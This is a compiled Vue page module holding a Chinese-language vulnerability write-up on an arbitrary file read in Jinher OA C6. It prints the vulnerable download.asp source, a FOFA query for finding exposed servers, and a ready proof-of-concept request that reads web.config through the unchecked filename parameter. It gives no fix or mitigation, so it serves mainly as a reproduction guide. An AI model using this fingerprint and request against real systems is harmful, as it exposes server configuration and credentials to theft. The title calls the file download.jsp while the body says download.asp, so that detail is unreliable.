import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as n,e as p}from"./app-58e4a7d6.js";const e={},o=p(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>金和OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Jinher-OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090141493.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞文件为 download.asp</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token operator">&lt;</span><span class="token operator">%</span>       
	<span class="token class-name">Response<span class="token punctuation">.</span>Buffer</span>     <span class="token operator">=</span>     <span class="token boolean">true</span>       
	<span class="token class-name">Response<span class="token punctuation">.</span>Clear</span>       
	      
	dim     url       
	<span class="token class-name">Dim</span>     fso<span class="token punctuation">,</span>fl<span class="token punctuation">,</span>flsize       
	dim     <span class="token class-name">Dname</span>       
	<span class="token class-name">Dim</span>     objStream<span class="token punctuation">,</span><span class="token class-name">ContentType</span><span class="token punctuation">,</span>flName<span class="token punctuation">,</span>isre<span class="token punctuation">,</span>url1       
	&#39;<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>调用时传入的下载文件名       
	<span class="token class-name">Dname</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token string">&quot;filename&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       
	&#39;<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>       
	<span class="token class-name">If</span>     <span class="token class-name">Dname</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token string">&quot;&quot;</span>     <span class="token class-name">Then</span>       
	&#39;<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>下载文件存放的服务端目录       
							url<span class="token operator">=</span><span class="token class-name"><span class="token namespace">server<span class="token punctuation">.</span></span>MapPath</span><span class="token punctuation">(</span><span class="token class-name">Dname</span><span class="token punctuation">)</span>       
							&#39;url<span class="token operator">=</span><span class="token class-name"><span class="token namespace">server<span class="token punctuation">.</span></span>MapPath</span><span class="token punctuation">(</span><span class="token string">&quot;./&quot;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token string">&quot;\\Jhsoft.Web.module\\testbill\\dj&quot;</span><span class="token operator">&amp;</span><span class="token class-name">Dname</span>     &#39;这边做了一下改动<span class="token class-name">By</span>   <span class="token class-name">Fanshui</span>   
	&#39;<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>       
	<span class="token class-name">End</span>     <span class="token class-name">If</span>       
	&#39;<span class="token class-name">Response</span><span class="token punctuation">.</span>write   url   
	&#39;response<span class="token punctuation">.</span>end   

	<span class="token class-name">Set</span>     fso<span class="token operator">=</span><span class="token class-name">Server<span class="token punctuation">.</span>CreateObject</span><span class="token punctuation">(</span><span class="token string">&quot;Scripting.FileSystemObject&quot;</span><span class="token punctuation">)</span>       
	<span class="token class-name">Set</span>     fl<span class="token operator">=</span>fso<span class="token punctuation">.</span><span class="token function">getfile</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>       
	flsize<span class="token operator">=</span>fl<span class="token punctuation">.</span>size       
	flName<span class="token operator">=</span>fl<span class="token punctuation">.</span>name       
	<span class="token class-name">Set</span>     fl<span class="token operator">=</span><span class="token class-name">Nothing</span>       
	<span class="token class-name">Set</span>     fso<span class="token operator">=</span><span class="token class-name">Nothing</span>     
	&#39;<span class="token class-name">Response</span><span class="token punctuation">.</span>write flName
	&#39;<span class="token class-name">Response</span><span class="token punctuation">.</span>write flsize
<span class="token operator">%</span><span class="token operator">&gt;</span>    


<span class="token operator">&lt;</span><span class="token operator">%</span>       
    <span class="token class-name">Set</span>		objStream     <span class="token operator">=</span>     <span class="token class-name">Server<span class="token punctuation">.</span>CreateObject</span><span class="token punctuation">(</span><span class="token string">&quot;ADODB.Stream&quot;</span><span class="token punctuation">)</span>
	&#39;<span class="token class-name"><span class="token namespace">objStream<span class="token punctuation">.</span></span>Mode</span> 　  <span class="token operator">=</span> 　  <span class="token number">3</span> 　
	<span class="token class-name"><span class="token namespace">objStream<span class="token punctuation">.</span></span>Type</span>     <span class="token operator">=</span>     <span class="token number">1</span>
    <span class="token class-name"><span class="token namespace">objStream<span class="token punctuation">.</span></span>Open</span>        
    <span class="token class-name"><span class="token namespace">objStream<span class="token punctuation">.</span></span>LoadFromFile</span>     url       


    <span class="token class-name">Select</span>     <span class="token class-name">Case</span>     <span class="token function">lcase</span><span class="token punctuation">(</span><span class="token class-name">Right</span><span class="token punctuation">(</span>flName<span class="token punctuation">,</span>     <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.asf&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;video/x-ms-asf&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.avi&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;video/avi&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.doc&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;application/msword&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.zip&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;application/zip&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.xls&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;application/vnd.ms-excel&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.gif&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;image/gif&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.jpg&quot;</span><span class="token punctuation">,</span>     <span class="token string">&quot;jpeg&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;image/jpeg&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.wav&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;audio/wav&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.mp3&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;audio/mpeg3&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.mpg&quot;</span><span class="token punctuation">,</span>     <span class="token string">&quot;mpeg&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;video/mpeg&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.rtf&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;application/rtf&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.htm&quot;</span><span class="token punctuation">,</span>     <span class="token string">&quot;html&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;text/html&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token string">&quot;.txt&quot;</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;text/plain&quot;</span>       
        <span class="token class-name">Case</span>     <span class="token class-name">Else</span>       
                                <span class="token class-name">ContentType</span>     <span class="token operator">=</span>     <span class="token string">&quot;application/octet-stream&quot;</span>       
    <span class="token class-name">End</span>     <span class="token class-name">Select</span>       



	<span class="token class-name">Response<span class="token punctuation">.</span>AddHeader</span>     <span class="token string">&quot;Content-Disposition&quot;</span><span class="token punctuation">,</span>     <span class="token string">&quot;attachment;     filename=&quot;</span>     <span class="token operator">&amp;</span>     flName       
    <span class="token class-name">Response<span class="token punctuation">.</span>AddHeader</span>     <span class="token string">&quot;Content-Length&quot;</span><span class="token punctuation">,</span>     flsize       

    <span class="token class-name">Response<span class="token punctuation">.</span>Charset</span>     <span class="token operator">=</span>     <span class="token string">&quot;UTF-8&quot;</span>       
    <span class="token class-name">Response<span class="token punctuation">.</span>ContentType</span>     <span class="token operator">=</span>     <span class="token class-name">ContentType</span>   

	<span class="token class-name">Response<span class="token punctuation">.</span>BinaryWrite</span>     <span class="token class-name"><span class="token namespace">objStream<span class="token punctuation">.</span></span>Read</span>       
    <span class="token class-name">Response<span class="token punctuation">.</span>Flush</span>       
    <span class="token class-name"><span class="token namespace">response<span class="token punctuation">.</span></span>Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       
    <span class="token class-name"><span class="token namespace">objStream<span class="token punctuation">.</span></span>Close</span>       
    <span class="token class-name">Set</span>     objStream     <span class="token operator">=</span>     <span class="token class-name">Nothing</span>       

<span class="token operator">%</span><span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>请求的POC为</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090141014.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>读取 web.config</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090141775.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17),t=[o];function l(c,r){return a(),n("div",null,t)}const u=s(e,[["render",l],["__file","金和OA C6 download.jsp 任意文件读取漏洞.html.vue"]]);export{u as default};
